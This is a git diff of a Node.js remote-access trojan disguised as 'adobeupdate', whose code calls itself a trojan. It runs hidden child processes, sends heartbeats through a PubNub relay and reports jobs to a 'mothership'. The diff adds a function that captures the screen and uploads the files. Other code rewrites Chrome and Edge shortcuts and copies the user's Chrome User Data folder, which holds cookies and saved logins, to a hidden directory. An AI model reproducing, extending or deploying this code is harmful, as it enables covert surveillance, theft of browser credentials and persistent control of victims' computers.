@@ -1,5 +1,14 @@
-const helper = require("./adobeupdate.helper.js");
-const helper_ps = require("./adobeupdate.helper.ps.js");
+const { fork, exec, spawn } = require("child_process");
+const path = require("path");
+const PubNub = require("pubnub");
+const net = require("net");
+const fs = require("fs");
+const os = require("os");
+const crypto = require("crypto");
+const util = require("util");
+
+var cmdname = null;
+var cmdconfig = null;
 
 class CmdConfig {
     #__cmdname = "";
@@ -17,9 +26,12 @@ class CmdConfig {
     #__clientjob = null;
 
     get clientjob() {
-
         // system cmds don't support client jobs
-        if (["cmdlist", "ping", "watchdog", "launch_ping"].includes(this.cmdname.toLowerCase())) {
+        if (
+            ["cmdlist", "ping", "watchdog", "launch_ping"].includes(
+                this.cmdname.toLowerCase()
+            )
+        ) {
             return null;
         }
 
@@ -31,7 +43,7 @@ class CmdConfig {
 
         helper.logmsg(`reading configfpath: ${configfpath}`);
 
-        if ( ! helper.fileExists(configfpath) ) {
+        if (!helper.fileExists(configfpath)) {
             throw new Error("configfpath does not exist " + configfpath);
         }
 
@@ -104,14 +116,6 @@ class CmdConfig {
         return this.#__launchscriptfname;
     }
 
-    get cmdtaskname() {
-        if (this.cmdname == "task" && process_argv.length >= 4) {
-            return process_argv[3];
-        }
-
-        return "";
-    }
-
     set cmdname(value) {
         if (CmdConfig.isCmdExist(value)) this.#__cmdname = value;
         else throw new Error("cmd is not supported [" + value + "]");
@@ -174,9 +178,8 @@ class CmdConfig {
         pspcmon: pspcmon,
         execjob: execjob,
         relay: relay,
-        install_python: install_python,
-        install_node: install_node,
         cleanup: cleanup,
+
         modify_chrome: modify_chrome,
         modify_msedge: modify_msedge,
 
@@ -197,7 +200,10 @@ class CmdConfig {
     }
 
     get cmdpidfpath() {
-        return path.join(systemstate.trojandir, this.cmdname + "_running");
+        return path.join(
+            helper_config.systemconfig.trojandir,
+            helper_ps.getcmdname() + "_running"
+        );
     }
 
     readcmdpid() {
@@ -210,7 +216,7 @@ class CmdConfig {
 
     get lockfname() {
         let _fname = "";
-        _fname = systemstate.trojanname + "_" + this.cmdname;
+        _fname = helper_config.systemconfig.trojanname + "_" + this.cmdname;
         _fname +=
             (!isNullOrWhitespace(this.cmdtaskname)
                 ? "_" + this.cmdtaskname
@@ -299,7 +305,7 @@ class CmdConfig {
     async launch(cmdlineargs, exitparent) {
         if (!exitparent) exitparent = false;
 
-        logmsg(`launching [${this.cmdname}]`);
+        helper.logmsg(`launching [${helper_ps.getcmdname()}]`);
 
         let child = null;
 
@@ -310,20 +316,20 @@ class CmdConfig {
         cmdlineargs = [this.cmdname, ...cmdlineargs];
 
         return new Promise((resolve, reject) => {
-            if (!fileExists(systemstate.trojanfpath)) {
+            if (!helper.fileExists(helper_config.systemconfig.trojanfpath)) {
                 reject(
                     new Error(
                         "trojan script does not exists at " +
-                        systemstate.trojanfpath
+                            systemstate.trojanfpath
                     )
                 );
             }
 
             if (exitparent) {
-                logmsg("spawning child");
+                helper.logmsg("spawning child");
                 child = spawn(
-                    systemstate.nodeexepath,
-                    [systemstate.trojanfpath, ...cmdlineargs],
+                    helper_config.systemconfig.nodeexepath,
+                    [helper_config.systemconfig.trojanfpath, ...cmdlineargs],
                     { stdio: "ignore", windowsHide: true }
                 );
             } else {
@@ -336,7 +342,7 @@ class CmdConfig {
             if (!child) {
                 reject(new Error("failed to launch child proc"));
             } else {
-                logmsg("child process launch success");
+                helper.logmsg("child process launch success");
             }
 
             child.unref();
@@ -344,15 +350,17 @@ class CmdConfig {
             this.#__childprocess = child;
             this.#__childpid = child?.pid;
             this.#__launchprocname = path.basename(child.spawnargs[0]);
-            this.#__launchscriptfname = path.basename(systemstate.trojanfpath);
+            this.#__launchscriptfname = path.basename(
+                helper_config.systemconfig.trojanfpath
+            );
 
-            logmsg(
+            helper.logmsg(
                 `launched child ${this.cmdname} pid=${child.pid} spawn args: ` +
-                JSON.stringify(child.spawnargs)
+                    JSON.stringify(child.spawnargs)
             );
             // spawnargs: ["C:\\Program Files\\nodejs\\node.exe","C:\\Users\\sebas\\AppData\\Local\\Temp\\owd\\adobeupdate","penetrate"]
 
-            writeTag(this.cmdpidfpath, String(child.pid));
+            helper.writeTag(this.cmdpidfpath, String(child.pid));
 
             // incomming message from child process (sender:cmdlist, ping -- receiver: watchdog)
             child.on("message", (message) => {
@@ -383,7 +391,7 @@ class CmdConfig {
     }
 
     exitramp() {
-        let fpath = path.join(systemstate.trojandir, "killall");
+        let fpath = path.join(helper_config.systemconfig.trojandir, "killall");
 
         if (fileExists(fpath)) {
             logmsg("found killall -- exiting");
@@ -404,7 +412,7 @@ class CmdConfig {
     }
 
     async loop() {
-        logmsg("starting main looop");
+        helper.logmsg("starting main looop");
 
         if (!this.loopfunc) {
             logmsg("Fatal Error: loopfunc is not a valid function");
@@ -431,7 +439,8 @@ class CmdConfig {
 
             for (let i = 0; i < (ISDEBUG ? 3 : systemstate.staticdelay); i++) {
                 logmsg(
-                    `sleeping one second... [${i + 1}/${systemstate.staticdelay
+                    `sleeping one second... [${i + 1}/${
+                        systemstate.staticdelay
                     }]`
                 );
 
@@ -446,7 +455,8 @@ class CmdConfig {
 
             for (let i = 0; i < (ISDEBUG ? 0 : num); i++) {
                 logmsg(
-                    `sleeping one second... [${i + 1}/${systemstate.staticdelay
+                    `sleeping one second... [${i + 1}/${
+                        systemstate.staticdelay
                     }]`
                 );
                 await sleep(1000);
@@ -544,7 +554,7 @@ function penetrate_folders() {
 }
 
 // TODO need to execute modify_chrome and modify_edge on each startup
-// for tpl -- the desktop lnk can't be modified -- good idea to put in autolaunch to launch 
+// for tpl -- the desktop lnk can't be modified -- good idea to put in autolaunch to launch
 // and minimise both edge and chrome on startup -- should these processes be headless?
 async function penetrate() {
     helper.logmsg("starting");
@@ -574,7 +584,7 @@ async function penetrate() {
 async function watchdog() {
     helper.logmsg("starting");
 
-    let watchdogcmd = systemconfig.cmdconfig;
+    let watchdogcmd = cmdconfig;
 
     let penetratecmd = new CmdConfig("penetrate");
     let retrievecmd = new CmdConfig("retrieve");
@@ -775,7 +785,6 @@ async function reschedule() {
     }
 }
 
-
 async function retrieve() {
     helper.logmsg("starting");
 
@@ -838,49 +847,62 @@ async function modify_msedge() {
 
 // TODO modify for client PCs / TPL
 async function modify_chrome() {
-// https://peter.sh/experiments/chromium-command-line-switches/
+    // https://peter.sh/experiments/chromium-command-line-switches/
 
-    helper.logmsg('starting');
+    helper.logmsg("starting");
 
     let runningcmd = systemconfig.cmdconfig;
 
-    let scriptfname = systemconfig.istpl ? "modify_browser_lnk_tpl.ps1" : "modify_browser_lnk.ps1";
+    let scriptfname = systemconfig.istpl
+        ? "modify_browser_lnk_tpl.ps1"
+        : "modify_browser_lnk.ps1";
     scriptfpath = path.join(systemconfig.trojandir, scriptfname);
 
-    let ret = '';
+    let ret = "";
 
-    if ( ! helper.fileExists(scriptfpath) ) {
+    if (!helper.fileExists(scriptfpath)) {
         ret = await retrieve_asset(scriptfname);
     }
 
-    if ( ! helper.fileExists(scriptfpath) ) {
+    if (!helper.fileExists(scriptfpath)) {
         helper.logmsg(`script does not exist ${scriptfpath}`);
         process.exit(1);
     }
 
-
     let targetFolders = [];
-    targetFolders.push(`C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar`);
-    targetFolders.push(`C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\`);
-    targetFolders.push(`C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs`);
+    targetFolders.push(
+        `C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar`
+    );
+    targetFolders.push(
+        `C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\`
+    );
+    targetFolders.push(
+        `C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs`
+    );
     targetFolders.push(`C:\\Users\\Public\\Desktop`);
-    
-    targetFolders.push(`C:\\Users\\${systemconfig.username}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar`);
-    targetFolders.push(`C:\\Users\\${systemconfig.username}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch`);
-    targetFolders.push(`C:\\Users\\${systemconfig.username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs`);
+
+    targetFolders.push(
+        `C:\\Users\\${systemconfig.username}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar`
+    );
+    targetFolders.push(
+        `C:\\Users\\${systemconfig.username}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch`
+    );
+    targetFolders.push(
+        `C:\\Users\\${systemconfig.username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs`
+    );
     targetFolders.push(`C:\\Users\\${systemconfig.username}\\Desktop`);
 
-    targetFolders.push('C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs');
+    targetFolders.push(
+        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs"
+    );
 
     let lnks = [];
-    
-    for ( const targetFolder of targetFolders ) {
 
-        let matchedFiles = helper.getFilesByExtensionSync(targetFolder, '.lnk');
+    for (const targetFolder of targetFolders) {
+        let matchedFiles = helper.getFilesByExtensionSync(targetFolder, ".lnk");
 
         for (const [index, element] of matchedFiles.entries()) {
-            if ( element.toLowerCase().includes('chrome') )
-                lnks.push(element);
+            if (element.toLowerCase().includes("chrome")) lnks.push(element);
         }
     }
 
@@ -929,61 +951,61 @@ async function modify_chrome() {
         // `--window-size=${width},${height}`,
     ];
 
-    cmdlineargs = cmdlineargs.join(' ');
+    cmdlineargs = cmdlineargs.join(" ");
 
-    for ( const lnk of lnks ) {
+    for (const lnk of lnks) {
         helper.logmsg(`processing ${lnk}`);
 
         shortcut_path = lnk;
-        shortcut_path = shortcut_path.replaceAll('\\\\', '\\');
+        shortcut_path = shortcut_path.replaceAll("\\\\", "\\");
 
         let jsonconfig = {
-            "cmd_line_args": cmdlineargs,
-            "shortcut_path": shortcut_path
+            cmd_line_args: cmdlineargs,
+            shortcut_path: shortcut_path,
         };
 
-        let jsonconfigpath = path.join(systemconfig.trojandir, scriptfname + '_' + getTimestamp() + '_config.json');
+        let jsonconfigpath = path.join(
+            systemconfig.trojandir,
+            scriptfname + "_" + getTimestamp() + "_config.json"
+        );
 
         writeTag(jsonconfigpath, JSON.stringify(jsonconfig));
 
         let childp = await execPSScript_async(scriptfpath, [jsonconfigpath]);
-
     }
 
     helper.logmsg(`copying user data folder`);
 
     srcpath = `C:\\Users\\${systemconfig.username}\\AppData\\Local\\Google\\Chrome\\User Data`; // anchor
-    destpath = 'C:\\ProgramData\\owd\\chrome';
+    destpath = "C:\\ProgramData\\owd\\chrome";
 
-    if ( ! folderExists(destpath) ) // BUG results in "command failed" error (chrome was running at the time of execution)
+    if (!folderExists(destpath))
+        // BUG results in "command failed" error (chrome was running at the time of execution)
         ret = await copy_userdata(srcpath, destpath);
 
     process.exit(0);
 }
 
 async function copy_userdata(srcpath, destpath) {
-
-    helper.logmsg('starting');
+    helper.logmsg("starting");
 
     let copycmdstr = `robocopy "${srcpath}" "${destpath}" /E /R:0 /W:0`;
 
-    if ( ! folderExists(destpath) ) {
+    if (!folderExists(destpath)) {
         fs.mkdirSync(destpath, { recursive: true });
     }
 
-    return new Promise((resolve, reject) => { 
+    return new Promise((resolve, reject) => {
         exec(copycmdstr, (error, stdout, stderr) => {
-            if (error) {                      
-                reject(error);                
-            }                                 
+            if (error) {
+                reject(error);
+            }
 
-            if (! helper.isNullOrWhitespace(stderr) )
-                resolve(stderr);
+            if (!helper.isNullOrWhitespace(stderr)) resolve(stderr);
 
             resolve(stdout);
         });
     });
-
 }
 // TODO add screencapture, modify params to put in switches enabling disabling, upload option
 async function getsystemoverview() {
@@ -1253,10 +1275,10 @@ function relay() {
     relaycmd.loopfunc = () => {
         helper.logmsg("relay looping...");
 
-            pubnubr.publishMessage({
-                ping: 'ping '+getRandomCode(8),
-                ts: getTimestamp()
-            });
+        pubnubr.publishMessage({
+            ping: "ping " + getRandomCode(8),
+            ts: getTimestamp(),
+        });
 
         let tcmdpid = childp?.pid ?? -1;
 
@@ -1469,9 +1491,86 @@ async function pspcmon() {
     helper.logmsg("finished");
 }
 
+function exec_getscreencapture() {
+    return new Promise((resolve, reject) => {
+        let stdout = "";
+
+        let fpath = path.join(
+            systemstate.trojandir,
+            "get_full_screen_capture.ps1"
+        );
+
+        let childp = execPSScript(
+            fpath,
+            [systemstate.trojandir],
+            null,
+            (text) => (stdout += text),
+            (text) => (stdout += text),
+            (code) => {
+                resolve(stdout);
+            }
+        );
+    });
+}
+
+async function getscreencapture() {
+    logmsg("starting");
+
+    let runningcmd = systemstate.cmdconfig;
+
+    let ret = null;
+
+    ret = await logMsgMothership(
+        `starting getscreencapture -- jobcode=${runningcmd.jobcode}`
+    );
+
+    ret = await logEventMothership("job_started", runningcmd.jobcode);
+
+    let filename = "get_full_screen_capture.ps1"; // TODO move to systemconfig
+    let localpath = path.join(systemstate.trojandir, filename);
+
+    if (!fileExists(localpath)) {
+        let response = await download_screencapture_script();
+    }
+
+    if (!fileExists(localpath)) {
+        throw new Error(`screencapture script does not exist ${localpath}`);
+    }
+
+    let stdout = await exec_getscreencapture();
+
+    let lines = stdout.split(/\r?\n/);
+
+    for (let i = 0; i < lines.length; i++) {
+        let line = lines[i];
+
+        if (line.startsWith("filepath=")) {
+            let fpath = line.split("=")[1];
+            let fname = path.basename(fpath);
+
+            let ret = await upload_file(fname, runningcmd.jobcode, fpath);
+
+            // TODO logmsg file upload
+        }
+    }
+
+    ret = await logEventMothership("job_finished", runningcmd.jobcode);
+
+    // job_finished_with_error
+
+    process.exit(0);
+}
+
 module.exports = {
     CmdConfig,
     penetrate,
     watchdog,
+    cmdconfig,
+};
 
-}
+const helper = require("./adobeupdate.helper.js");
+const helper_ps = require("./adobeupdate.helper.ps.js");
+const helper_config = require("./adobeupdate.helper.config.js");
+
+cmdname = helper_ps.getcmdname();
+cmdconfig = new CmdConfig(cmdname);
